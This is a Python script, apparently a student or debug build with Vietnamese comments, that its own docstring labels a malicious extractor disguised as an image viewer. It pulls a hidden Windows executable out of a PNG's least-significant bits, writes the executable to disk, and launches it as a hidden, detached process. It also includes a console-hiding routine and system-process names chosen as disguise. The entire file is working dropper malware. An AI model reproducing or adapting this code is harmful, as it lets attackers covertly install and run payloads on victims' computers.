"""
Image Viewer Pro - Malicious Extractor (DEBUG VERSION)
Ngụy trang như image viewer nhưng thực chất extract và chạy payload
"""

from PIL import Image
import numpy as np
import os
import sys
import subprocess
import tempfile
import time
import threading

class ImageExtractor:
    def __init__(self):
        self.HEADER_MARKER = "<<EXE_START>>"
        self.DATA_MARKER = "<<DATA_START>>"
    
    def extract_exe(self, image_path):
        """
        Trích xuất EXE từ ảnh
        
        Returns:
            bytes: Payload data hoặc None nếu không tìm thấy
        """
        print("[DEBUG] Starting extraction process...")
        print(f"[DEBUG] Image path: {image_path}")
        
        try:
            # Mở ảnh
            print("[DEBUG] Opening image...")
            img = Image.open(image_path)
            print(f"[DEBUG] Image mode: {img.mode}")
            print(f"[DEBUG] Image size: {img.size}")
            
            if img.mode != 'RGB':
                print("[DEBUG] Converting to RGB...")
                img = img.convert('RGB')
            
            img_array = np.array(img)
            print(f"[DEBUG] Image array shape: {img_array.shape}")
            
            # Đọc tất cả LSB
            print("[DEBUG] Reading LSB data...")
            binary_data = ""
            total_pixels = img_array.shape[0] * img_array.shape[1]
            
            for i in range(img_array.shape[0]):
                for j in range(img_array.shape[1]):
                    for k in range(3):
                        binary_data += str(img_array[i, j, k] & 1)
                
                # Progress indicator every 100 rows
                if i % 100 == 0:
                    progress = (i / img_array.shape[0]) * 100
                    print(f"[DEBUG] Reading progress: {progress:.1f}%", end='\r')
            
            print(f"\n[DEBUG] Total bits read: {len(binary_data)}")
            
            # Chuyển binary về text để tìm header
            print("[DEBUG] Searching for header...")
            header_text = ""
            max_header_bits = min(len(binary_data), 50000)
            
            for i in range(0, max_header_bits, 8):
                byte = binary_data[i:i+8]
                if len(byte) == 8:
                    char = chr(int(byte, 2))
                    header_text += char
                    
                    # Tìm marker
                    if self.DATA_MARKER in header_text:
                        print(f"[DEBUG] Found DATA_MARKER at position {i//8}")
                        break
            
            print(f"[DEBUG] Header text length: {len(header_text)}")
            
            # Parse header
            if self.HEADER_MARKER not in header_text:
                print("[DEBUG] ERROR: HEADER_MARKER not found!")
                print(f"[DEBUG] Header preview (first 200 chars): {header_text[:200]}")
                return None
            
            print("[DEBUG] HEADER_MARKER found!")
            
            header_start = header_text.find(self.HEADER_MARKER) + len(self.HEADER_MARKER)
            exe_size_str = header_text[header_start:header_start+10]
            print(f"[DEBUG] EXE size string: '{exe_size_str}'")
            
            try:
                exe_size = int(exe_size_str)
                print(f"[DEBUG] EXE size: {exe_size:,} bytes")
            except ValueError as e:
                print(f"[DEBUG] ERROR: Cannot parse EXE size: {e}")
                return None
            
            # Tính vị trí bắt đầu data
            data_start_pos = header_text.find(self.DATA_MARKER) + len(self.DATA_MARKER)
            data_start_bit = len(header_text[:data_start_pos]) * 8
            print(f"[DEBUG] Data starts at bit: {data_start_bit}")
            
            # Đọc EXE data
            exe_end_bit = data_start_bit + (exe_size * 8)
            print(f"[DEBUG] Reading EXE data from bit {data_start_bit} to {exe_end_bit}")
            
            if exe_end_bit > len(binary_data):
                print(f"[DEBUG] ERROR: Not enough data! Need {exe_end_bit}, have {len(binary_data)}")
                return None
            
            exe_binary = binary_data[data_start_bit:exe_end_bit]
            print(f"[DEBUG] EXE binary length: {len(exe_binary)} bits")
            
            # Chuyển binary về bytes
            print("[DEBUG] Converting binary to bytes...")
            exe_bytes = bytearray()
            for i in range(0, len(exe_binary), 8):
                byte = exe_binary[i:i+8]
                if len(byte) == 8:
                    exe_bytes.append(int(byte, 2))
                
                # Progress indicator
                if i % 80000 == 0:
                    progress = (i / len(exe_binary)) * 100
                    print(f"[DEBUG] Conversion progress: {progress:.1f}%", end='\r')
            
            print(f"\n[DEBUG] Extracted {len(exe_bytes)} bytes")
            print(f"[DEBUG] First 16 bytes (hex): {exe_bytes[:16].hex()}")
            
            # Kiểm tra MZ header (Windows PE)
            if exe_bytes[:2] == b'MZ':
                print("[DEBUG] ✓ Valid Windows PE executable detected!")
            else:
                print(f"[DEBUG] WARNING: Not a standard PE file. Header: {exe_bytes[:2]}")
            
            return bytes(exe_bytes)
        
        except Exception as e:
            print(f"[DEBUG] EXCEPTION in extract_exe: {type(e).__name__}: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def execute_payload(self, payload_bytes):
        """
        Thực thi payload trong nền
        """
        print("[DEBUG] Starting payload execution...")
        
        try:
            # Tạo temp file với tên ngụy trang
            temp_dir = tempfile.gettempdir()
            print(f"[DEBUG] Temp directory: {temp_dir}")
            
            # Tên file ngụy trang (giống process hệ thống)
            if sys.platform == 'win32':
                payload_name = 'svchost.exe'
            else:
                payload_name = '.systemd'
            
            payload_path = "D:\\KTLT-code\\icon_malware_extracted.exe"
            print(f"[DEBUG] Payload path: {payload_path}")
            
            # Ghi payload
            print(f"[DEBUG] Writing {len(payload_bytes)} bytes to disk...")
            with open(payload_path, 'wb') as f:
                f.write(payload_bytes)
            
            file_size = os.path.getsize(payload_path)
            print(f"[DEBUG] File written: {file_size} bytes")
            
            # Chạy payload (silent mode)
            if sys.platform == 'win32':
                print("[DEBUG] Executing on Windows (silent mode)...")
                # Windows: Chạy ẩn hoàn toàn
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                
                process = subprocess.Popen(
                    [payload_path],
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
                )
                print(f"[DEBUG] Process started with PID: {process.pid}")
            else:
                print("[DEBUG] Executing on Linux/Mac...")
                # Linux/Mac
                os.chmod(payload_path, 0o755)
                process = subprocess.Popen(
                    [payload_path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print(f"[DEBUG] Process started with PID: {process.pid}")
            
            # Đợi payload khởi động
            print("[DEBUG] Waiting for payload to initialize...")
            time.sleep(2)
            
            # Kiểm tra process còn chạy không
            if process.poll() is None:
                print("[DEBUG] ✓ Payload is running!")
            else:
                print(f"[DEBUG] WARNING: Payload exited with code {process.returncode}")
            
            print("[DEBUG] Execution complete!")
            
        except Exception as e:
            print(f"[DEBUG] EXCEPTION in execute_payload: {type(e).__name__}: {e}")
            import traceback
            traceback.print_exc()

def hide_console():
    """Ẩn console window"""
    print("[DEBUG] Hiding console window...")
    if sys.platform == 'win32':
        import ctypes
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(),
            0  # SW_HIDE
        )
        print("[DEBUG] Console hidden (Windows)")

def main():
    """
    Main function - Ngụy trang như image viewer
    """
    print("="*70)
    print("IMAGE VIEWER PRO - DEBUG MODE")
    print("="*70)
    
    # COMMENT OUT để debug - không ẩn console
    # hide_console()
    
    print(f"[DEBUG] Platform: {sys.platform}")
    print(f"[DEBUG] Python version: {sys.version}")
    print(f"[DEBUG] Current working directory: {os.getcwd()}")
    
    # Tìm ảnh stego (cùng thư mục với extractor)
    current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    print(f"[DEBUG] Script directory: {current_dir}")
    
    # Tên ảnh mặc định
    stego_image = os.path.join(current_dir, 'icon_malware.png')
    print(f"[DEBUG] Looking for: {stego_image}")
    
    # Nếu không tìm thấy, tìm file PNG đầu tiên
    if not os.path.exists(stego_image):
        print("[DEBUG] Default image not found, searching for PNG files...")
        
        png_files = [f for f in os.listdir(current_dir) if f.lower().endswith('.png')]
        print(f"[DEBUG] Found PNG files: {png_files}")
        
        if png_files:
            stego_image = os.path.join(current_dir, png_files[0])
            print(f"[DEBUG] Using: {stego_image}")
        else:
            print("[DEBUG] ERROR: No PNG files found!")
    
    # Nếu vẫn không tìm thấy, thoát im lặng
    if not os.path.exists(stego_image):
        print("[DEBUG] ERROR: Stego image not found! Exiting...")
        input("[DEBUG] Press Enter to exit...")
        sys.exit(0)
    
    print(f"[DEBUG] Stego image exists: {os.path.exists(stego_image)}")
    print(f"[DEBUG] File size: {os.path.getsize(stego_image):,} bytes")
    
    # Tạo extractor
    print("\n" + "="*70)
    extractor = ImageExtractor()
    
    # Extract payload
    print("\n[STEP 1] EXTRACTING PAYLOAD...")
    print("="*70)
    payload_bytes = extractor.extract_exe(stego_image)
    
    # Kiểm tra kết quả
    if payload_bytes:
        print("\n" + "="*70)
        print("[STEP 2] PAYLOAD EXTRACTED SUCCESSFULLY!")
        print("="*70)
        print(f"[DEBUG] Payload size: {len(payload_bytes):,} bytes")
        
        # Execute payload
        print("\n" + "="*70)
        print("[STEP 3] EXECUTING PAYLOAD...")
        print("="*70)
        extractor.execute_payload(payload_bytes)
        
        print("\n" + "="*70)
        print("ALL STEPS COMPLETED!")
        print("="*70)
    else:
        print("\n" + "="*70)
        print("[ERROR] FAILED TO EXTRACT PAYLOAD!")
        print("="*70)
        print("[DEBUG] Possible reasons:")
        print("  1. Image doesn't contain hidden data")
        print("  2. Wrong image format or corrupted")
        print("  3. Markers not found in expected positions")
    
    # Đợi user đọc output
    print("\n[DEBUG] Press Enter to exit...")
    input()
    sys.exit(0)

if __name__ == '__main__':
    main()